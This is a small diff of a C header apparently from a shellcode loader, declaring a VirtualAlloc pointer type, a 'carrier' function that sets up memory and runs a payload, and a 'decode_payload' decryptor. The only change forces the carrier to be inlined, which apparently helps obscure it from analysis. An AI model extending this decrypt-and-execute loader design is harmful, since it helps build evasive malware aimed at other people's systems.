@@ -29,7 +29,7 @@ typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
 
 // Carrier: Responsible for setting up memory and executing payload.
 // Returns 0 on success, non-zero on error.
-int carrier(void);
+FORCE_INLINE int carrier(void);
 
 // Decoder: Decrypts 'len' bytes at 'dest'.
 FORCE_INLINE void decode_payload(char *dest, int len);
